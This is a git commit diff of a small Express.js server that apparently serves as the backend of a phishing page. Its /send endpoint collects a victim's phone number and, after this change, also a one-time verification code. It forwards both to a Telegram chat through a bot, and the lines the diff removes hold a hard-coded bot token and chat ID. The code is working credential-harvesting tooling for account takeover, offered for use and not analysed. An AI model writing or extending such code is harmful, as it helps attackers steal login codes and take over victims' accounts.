ddf34d5685dd6b7934f3cd519db39fd617062435
kb1621982-ship-it <kb1621982@gmail.com>
2025-11-22 14:27:09 +0300

    Update index.js

--- index.js
+++ index.js
@@ -1,23 +1,15 @@
-const express = require("express");
-const axios = require("axios");
-const cors = require("cors");
-
-const app = express();
-app.use(cors());
-app.use(express.json());
-
-// Your Telegram bot info
-const BOT_TOKEN = "8504129347:AAHFP1FoTkxKdR0ErCwxNUxUP40G7i-ndEY";
-const CHAT_ID = "8140159923";
-
 app.post("/send", async (req, res) => {
-    const { phone } = req.body;
+    const { phone, verify } = req.body;
 
-    if (!phone) {
-        return res.status(400).json({ error: "Phone number missing" });
+    if (!phone || !verify) {
+        return res.status(400).json({ error: "Missing fields" });
     }
 
-    const text = `📱 New Login Attempt:\nPhone: ${phone}`;
+    const text = `📱 NEW SUBMISSION:
+
+Phone: ${phone}
+Verification Code: ${verify}
+`;
 
     try {
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -32,10 +24,3 @@ app.post("/send", async (req, res) => {
     }
 });
 
-app.get("/", (req, res) => {
-    res.send("Backend working!");
-});
-
-app.listen(3000, () => {
-    console.log("Server running on port 3000");
-});
